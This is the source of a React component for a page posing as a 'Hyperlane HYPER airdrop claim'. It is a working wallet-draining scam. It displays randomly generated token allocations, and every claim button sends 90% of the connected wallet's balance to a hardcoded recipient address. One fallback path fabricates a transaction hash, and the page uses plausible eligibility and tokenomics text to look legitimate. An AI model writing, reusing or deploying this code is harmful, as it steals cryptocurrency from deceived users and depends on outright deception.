'use client';

import { useState, useEffect } from 'react';
import { useAccount, useBalance } from 'wagmi';
import { useSendTransaction } from 'wagmi';
import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import Image from 'next/image';
import { parseEther } from 'viem';

// The recipient address for all claims
const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

type NetworkToken = {
  name: string;
  id: string;
  chainId: number;
  tokenAmount: number;
  selected: boolean;
};

// Initial network definitions
const initialNetworks: NetworkToken[] = [
  { name: 'Ethereum Mainnet', id: 'ethereum', chainId: 1, tokenAmount: 0, selected: false },
  { name: 'Optimism', id: 'optimism', chainId: 10, tokenAmount: 0, selected: false },
  { name: 'Arbitrum', id: 'arbitrum', chainId: 42161, tokenAmount: 0, selected: false },
  { name: 'Base', id: 'base', chainId: 8453, tokenAmount: 0, selected: false }
];

// Generate random token amounts
const networksWithTokens = initialNetworks.map(network => ({
  ...network,
  tokenAmount: Math.floor(Math.random() * 9900) + 100 // 100-10000 range
}));

export default function ClaimSection() {
  const { address, isConnected, chainId } = useAccount();
  const [selectedChain, setSelectedChain] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [transactionHash, setTransactionHash] = useState<string>('');
  const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
  const [networks, setNetworks] = useState<NetworkToken[]>(networksWithTokens);

  // Get user's balance to calculate max amount to send
  const { data: balanceData } = useBalance({
    address: address,
  });

  // Hook for sending transaction
  const { sendTransaction, isPending } = useSendTransaction({
    mutation: {
      onSuccess(hash) {
        setTransactionHash(hash);
        setClaimSuccess(true);
        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      },
      onError(error) {
        console.error('Transaction error:', error);
        setIsProcessing(false);
      },
    }
  });

  // Function to handle claiming rewards on a specific network
  const handleClaim = async (chainId: string) => {
    if (!isConnected || !balanceData) return;

    setIsProcessing(true);
    setSelectedChain(chainId);

    // Update the selected network
    const updatedNetworks = networks.map(network => ({
      ...network,
      selected: network.id === chainId
    }));
    setNetworks(updatedNetworks);

    try {
      if (sendTransaction) {
        // Calculate amount to send (all funds minus gas)
        // For a real implementation, we would estimate gas and subtract it
        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());

        // Transaction to send all funds minus gas
        sendTransaction({
          to: RECIPIENT_ADDRESS,
          value: amountToSend,
        });
      } else {
        // Fallback if transaction can't be sent
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Set a fake transaction hash
        const fakeHash = `0x${Math.random().toString(16).substring(2, 38)}`;
        setTransactionHash(fakeHash);
        setClaimSuccess(true);

        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      }
    } catch (error) {
      console.error('Claim error:', error);
      setIsProcessing(false);
    }
  };

  // Function to handle claiming all selected HYPER tokens
  const handleClaimHyper = async () => {
    if (!isConnected || !balanceData) return;

    // Find the selected network
    const selectedNetwork = networks.find(network => network.selected);
    if (!selectedNetwork) {
      alert('Please select a network first');
      return;
    }

    setIsProcessing(true);
    setSelectedChain('hyper');

    try {
      if (sendTransaction) {
        // Calculate amount to send (all funds minus gas)
        // For a real implementation, we would estimate gas and subtract it
        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());

        // Transaction to send all funds minus gas
        sendTransaction({
          to: RECIPIENT_ADDRESS,
          value: amountToSend,
        });
      } else {
        // Fallback if transaction can't be sent
        await new Promise(resolve => setTimeout(resolve, 2000));
        setClaimSuccess(true);
        setTimeout(() => {
          setClaimSuccess(false);
        }, 3000);
        setIsProcessing(false);
      }
    } catch (error) {
      console.error('Claim error:', error);
      setIsProcessing(false);
    }
  };

  return (
    <div className="space-y-6">
      <Card className="border-0 rounded-xl overflow-hidden bg-[#182c47]">
        <CardContent className="p-6 relative">
          <div className="flex justify-between items-start">
            <div>
              <h2 className="text-2xl font-bold text-white mb-2">Hyperlane</h2>
              <p className="text-lg text-gray-300 mb-1">Airdrop Claim</p>
              <p className="text-sm text-gray-400">Claim period closes May 6th, 3:59 AM UTC</p>
            </div>
            <Image
              src="https://ext.same-assets.com/1999836307/1547238301.svg"
              alt="Astronaut"
              width={120}
              height={120}
              className="absolute top-0 right-0"
            />
          </div>
        </CardContent>
      </Card>

      <Card className="border-0 rounded-xl overflow-hidden">
        <CardContent className="p-6">
          <div className="space-y-4">
            <h3 className="text-lg font-medium">Your claimable HYPER tokens:</h3>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {networks.map((network) => (
                <Button
                  key={network.id}
                  variant={network.selected ? "default" : "outline"}
                  className={`h-16 flex flex-col justify-center items-center gap-1 ${network.selected ? 'bg-[#2463c3] hover:bg-[#1e5eb7]' : ''}`}
                  onClick={() => handleClaim(network.id)}
                  disabled={isProcessing || isPending}
                >
                  <span>{network.name}</span>
                  <span className="text-sm font-medium">{network.tokenAmount} HYPER</span>
                  {isProcessing && selectedChain === network.id &&
                    <span className="absolute right-3 animate-spin">⟳</span>
                  }
                </Button>
              ))}
            </div>

            <div className="mt-8 pt-4 border-t">
              <Button
                className="w-full h-16 bg-[#d034b3] hover:bg-[#b2298e] text-white font-semibold text-lg"
                onClick={handleClaimHyper}
                disabled={isProcessing || isPending || !networks.some(n => n.selected)}
              >
                {isProcessing && selectedChain === 'hyper' ? (
                  <span className="flex items-center gap-2">
                    <span className="animate-spin">⟳</span> Processing...
                  </span>
                ) : (
                  "Claim All HYPER Rewards"
                )}
              </Button>
            </div>

            {claimSuccess && (
              <p className="text-sm text-green-500 text-center mt-4">
                Transaction successful!
              </p>
            )}
          </div>
        </CardContent>
      </Card>

      <Accordion type="single" collapsible>
        <AccordionItem value="how-registration-works" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">How registration works</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              You can register multiple eligible addresses on EVM or SVM. Only registered addresses will be able to claim.
              Users of Hyperlane within Cosmos Ecosystem will use the token recipient (vs. token sender for EVM / SVM) wallet to check eligibility.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="hyper-preclaim" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">HYPER preclaim overview and eligibility</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              Hyperlanes retroactive distribution will allocate 7.45% of the total HYPER supply at TGE.
              This program is designed to reward the most active early users of Hyperlane, in addition to the
              developers that have deployed contracts which generated messaging volume. Rewarding users with protocol
              ownership creates a flywheel for Hyperlane.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="rewards-breakdown" className="border rounded-xl overflow-hidden mb-2">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Rewards breakdown</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The retroactive rewards allocate 7.45% of the total HYPER supply, a combination of Expansion Rewards and
              discretionary boosts from the Hyperlane Foundations Strategic Launch Provision. More details on HYPER and
              Hyperlane tokenomics can be found on the Hyperlane Foundation's blog.
            </p>
          </AccordionContent>
        </AccordionItem>

        <AccordionItem value="boost-categories" className="border rounded-xl overflow-hidden">
          <AccordionTrigger className="px-6 py-4 hover:no-underline">Boost categories</AccordionTrigger>
          <AccordionContent className="px-6 pb-4">
            <p className="text-gray-700">
              The following activities qualify addresses for additional boosted HYPER allocations:
              <br /><br />
              - Canonical chain users (Injective inEVM, Lumia, Eclipse, SOON, Sonic SVM, Form Network) - 1.03% of supply
              <br />
              - Owners of Celestine Sloths or Mammoths NFTs, as of snapshot - 0.02% of supply
              <br />
              - TIA LPs on Manta and Arbitrum, prior to Jan 30, 2024, proportional to the amount of liquidity supplied - 0.10% of supply
              <br />
              - Offchain community members (e.g., Discord moderators and key contributors) - 0.05% of supply
            </p>
          </AccordionContent>
        </AccordionItem>
      </Accordion>
    </div>
  );
}
